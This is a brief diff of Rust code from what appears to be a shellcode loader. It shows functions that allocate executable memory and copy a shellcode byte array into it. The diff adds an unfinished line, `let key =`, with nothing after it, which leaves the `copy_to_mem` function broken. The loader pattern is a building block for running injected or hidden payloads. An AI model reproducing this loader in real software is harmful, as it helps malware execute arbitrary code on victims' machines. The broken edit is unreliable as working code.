@@ -19,6 +19,7 @@ fn alloc_executable_memory(size: usize) -> *mut libc::c_void {
 }
 
 fn copy_to_mem(shellcode: &[u8], mem: *mut libc::c_void) -> *mut libc::c_void {
+    let key =  
     unsafe {
         std::ptr::copy_nonoverlapping(shellcode.as_ptr(), mem as *mut u8, shellcode.len());
         mem
